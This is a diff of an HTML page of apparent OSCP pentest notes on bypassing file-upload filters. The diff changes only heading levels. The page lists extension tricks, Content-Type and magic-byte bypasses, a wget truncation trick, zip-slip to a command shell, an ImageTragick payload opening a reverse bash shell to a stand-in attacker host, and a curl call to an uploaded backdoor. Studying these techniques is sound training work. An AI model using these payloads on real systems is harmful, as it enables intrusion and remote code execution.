@@ -173,11 +173,13 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p>Only refer Extensions section below for OSCP File upload Bypassing</p>
+                        <h2 id="file-uploads"><a class="header" href="#file-uploads">File Uploads</a></h2>
+<p>Only refer Extensions section below for OSCP File upload Bypassing</p>
+<h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">Total OSCP Guide File Uploads</a></li>
 </ul>
-<h2 id="extensions"><a class="header" href="#extensions">EXTENSIONS</a></h2>
+<h3 id="extensions"><a class="header" href="#extensions">EXTENSIONS</a></h3>
 <ul>
 <li><strong>PHP</strong>: <em>.php</em>, <em>.php2</em>, <em>.php3</em>, .<em>php4</em>, .<em>php5</em>, .<em>php6</em>, .<em>php7</em>, .phps, .<em>phps</em>, .<em>pht</em>, .<em>phtm, .phtml</em>, .<em>pgif</em>, <em>.shtml, .htaccess, .phar, .inc</em></li>
 <li><strong>ASP</strong>: <em>.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml</em></li>
@@ -187,7 +189,7 @@
 <li><strong>Perl</strong>: <em>.pl, .cgi</em></li>
 <li><strong>Erlang Yaws Web Server</strong>: <em>.yaws</em></li>
 </ul>
-<h2 id="bypass-file-extensions-checks"><a class="header" href="#bypass-file-extensions-checks">Bypass file extensions checks</a></h2>
+<h3 id="bypass-file-extensions-checks"><a class="header" href="#bypass-file-extensions-checks">Bypass file extensions checks</a></h3>
 <ol>
 <li>
 <p>If they apply, then check the previous extensions. Also test them using some uppercase letters: PHP, .pHP5, .PhAr ...</p>
@@ -242,7 +244,7 @@
 <p>Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)</p>
 </li>
 </ol>
-<h2 id="bypass-content-type--magic-number"><a class="header" href="#bypass-content-type--magic-number">Bypass Content-Type &amp; magic number</a></h2>
+<h3 id="bypass-content-type--magic-number"><a class="header" href="#bypass-content-type--magic-number">Bypass Content-Type &amp; magic number</a></h3>
 <ol>
 <li>
 <p>Bypass Content-Type checks by setting the value of the Content-Type header to image/png, text/plain, application/octet-stream</p>
@@ -256,7 +258,7 @@
 <ul>
 <li>It is also possible that the <strong>magic bytes</strong> are just being <strong>checked</strong> in the file and you could set them <strong>anywhere in the file</strong>.</li>
 </ul>
-<h2 id="other-tricks-to-check"><a class="header" href="#other-tricks-to-check">Other Tricks to check</a></h2>
+<h3 id="other-tricks-to-check"><a class="header" href="#other-tricks-to-check">Other Tricks to check</a></h3>
 <ul>
 <li>
 <p>Find a vulnerability to rename the file already uploaded (to change the extension).</p>
@@ -279,7 +281,7 @@
 <p>Try also to upload an executable (.exe) or a .html (less suspicious) that will execute code when accidentally opened by the victim.</p>
 </li>
 </ul>
-<h2 id="wget-file-uploadssrf-trick"><a class="header" href="#wget-file-uploadssrf-trick">wget File Upload/SSRF Trick</a></h2>
+<h3 id="wget-file-uploadssrf-trick"><a class="header" href="#wget-file-uploadssrf-trick">wget File Upload/SSRF Trick</a></h3>
 <p>On some occasions, you may find that a server is using <strong><code>wget</code></strong> to <strong>download files</strong> and you can <strong>indicate</strong> the <strong>URL</strong>. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, <strong>this check can be bypassed.</strong> The <strong>maximum</strong> length of a <strong>filename</strong> in L<strong>inux</strong> is <strong>255</strong>, however, <strong>wget</strong> truncate the filenames to <strong>236</strong> characters. You can <strong>download a file called "A"*232+".php"+".gif"</strong>, this filename will <strong>bypass</strong> the <strong>check</strong> (as in this example <strong>".gif"</strong> is a <strong>valid</strong> extension) but <code>wget</code> will <strong>rename</strong> the file to <strong>"A"*232+".php"</strong>.</p>
 <pre><code>#Create file and HTTP server
 echo "SOMETHING" &gt; $(python -c 'print("A"*(236-4)+".php"+".gif")')
@@ -301,7 +303,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[=============================================
 2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
 </code></pre>
 <p>Note that <strong>another option</strong> you may be thinking of to bypass this check is to make the <strong>HTTP server redirect to a different file</strong>, so the initial URL will bypass the check by then Wget will download the redirected file with the new name. This <strong>won't work</strong> <strong>unless</strong> the wget is being used with the <strong>parameter</strong> <code>--trust-server-names</code> because the <strong>wget will download the redirected page with the name of the file indicated in the original URL</strong>.</p>
-<h2 id="from-file-upload-to-other-vulnerabilities"><a class="header" href="#from-file-upload-to-other-vulnerabilities">From File upload to other vulnerabilities</a></h2>
+<h3 id="from-file-upload-to-other-vulnerabilities"><a class="header" href="#from-file-upload-to-other-vulnerabilities">From File upload to other vulnerabilities</a></h3>
 <ul>
 <li>Set <strong>filename</strong> to <code>../../../tmp/lol.png</code> and try to achieve a <strong>path traversal</strong></li>
 <li>Set <strong>filename</strong> to <code>sleep(10)-- -.jpg</code> and you may be able to achieve a <strong>SQL injection</strong></li>
@@ -321,19 +323,19 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[=============================================
 <li><strong>ZIP</strong>: RCE via LFI / DoS</li>
 <li><strong>PDF / PPTX</strong>: SSRF / BLIND XXE</li>
 </ol>
-<h2 id="magic-header-bytes"><a class="header" href="#magic-header-bytes">Magic Header Bytes</a></h2>
+<h3 id="magic-header-bytes"><a class="header" href="#magic-header-bytes">Magic Header Bytes</a></h3>
 <ul>
 <li><strong>PNG</strong>: <code>"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["</code></li>
 <li><strong>JPG</strong>: <code>"\xff\xd8\xff"</code></li>
 </ul>
-<h2 id="zip-file-automatically-decompressed-upload"><a class="header" href="#zip-file-automatically-decompressed-upload">Zip File Automatically decompressed Upload</a></h2>
+<h3 id="zip-file-automatically-decompressed-upload"><a class="header" href="#zip-file-automatically-decompressed-upload">Zip File Automatically decompressed Upload</a></h3>
 <p>If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:</p>
-<h3 id="symlink"><a class="header" href="#symlink">Symlink</a></h3>
+<h4 id="symlink"><a class="header" href="#symlink">Symlink</a></h4>
 <p>Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:</p>
 <pre><code>ln -s ../../../index.php symindex.txt
 zip --symlinks test.zip symindex.txt
 </code></pre>
-<h3 id="decompress-in-different-folders"><a class="header" href="#decompress-in-different-folders">Decompress in different folders</a></h3>
+<h4 id="decompress-in-different-folders"><a class="header" href="#decompress-in-different-folders">Decompress in different folders</a></h4>
 <p>The decompressed files will be created in unexpected folders.</p>
 <p>One could easily assume that this setup protects from OS-level command execution via malicious file uploads but unfortunately, this is not true. Since the ZIP archive format supports hierarchical compression and we can also reference higher-level directories we can escape from the safe upload directory by abusing the decompression feature of the target application.</p>
 <p>An automated exploit to create this kind of files can be found here: <a href="https://github.com/ptoomey3/evilarc">https://github.com/ptoomey3/evilarc</a></p>
@@ -398,22 +400,22 @@ root@s2crew:/tmp#
 Only one step remained: Upload the ZIP file and let the application decompress it! If it succeeds and the web server has sufficient privileges to write the directories there will be a simple OS command execution shell on the system:</p>
 <pre><code>url/cmd.php?cmd=id
 </code></pre>
-<h2 id="imagetragic"><a class="header" href="#imagetragic">ImageTragic</a></h2>
+<h3 id="imagetragic"><a class="header" href="#imagetragic">ImageTragic</a></h3>
 <p>Upload this content with an image extension to exploit the vulnerability <strong>(ImageMagick, 7.0.1-1)</strong></p>
 <pre><code>push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://127.0.0.1/test.jpg"|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch "hello)'
 pop graphic-context
 </code></pre>
-<h2 id="embedding-php-shell-on-png"><a class="header" href="#embedding-php-shell-on-png">Embedding PHP Shell on PNG</a></h2>
+<h3 id="embedding-php-shell-on-png"><a class="header" href="#embedding-php-shell-on-png">Embedding PHP Shell on PNG</a></h3>
 <p>The primary reason for putting a web shell in the IDAT chunk is that it has the ability to bypass resize and re-sampling operations - PHP-GD contains two functions to do this <a href="http://php.net/manual/en/function.imagecopyresized.php">imagecopyresized</a> and <a href="http://php.net/manual/en/function.imagecopyresampled.php">imagecopyresampled</a>.</p>
 <p>Read this post: <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
-<h2 id="polyglot-files"><a class="header" href="#polyglot-files">Polyglot Files</a></h2>
+<h3 id="polyglot-files"><a class="header" href="#polyglot-files">Polyglot Files</a></h3>
 <p>Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a <a href="https://en.wikipedia.org/wiki/Gifar">GIFAR</a> is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.</p>
 <p>Polyglot files are often used to bypass protection based on file types. Many applications that allow users to upload files only allow uploads of certain types, such as JPEG, GIF, DOC, so as to prevent users from uploading potentially dangerous files like JS files, PHP files or Phar files.</p>
 <p>This helps to upload a file that complies with the format of several different formats. It can allow you to upload a PHAR file (PHP ARchive) that also looks like a JPEG, but probably you will still need a valid extension and if the upload function doesn't allow it this won't help you.</p>
 <p>More information in: <a href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a">https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></p>
-<h2 id="php-powershell-upload-example"><a class="header" href="#php-powershell-upload-example">PHP PowerShell Upload Example</a></h2>
+<h3 id="php-powershell-upload-example"><a class="header" href="#php-powershell-upload-example">PHP PowerShell Upload Example</a></h3>
 <pre><code>Upload the backdoor, then:
 
 curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
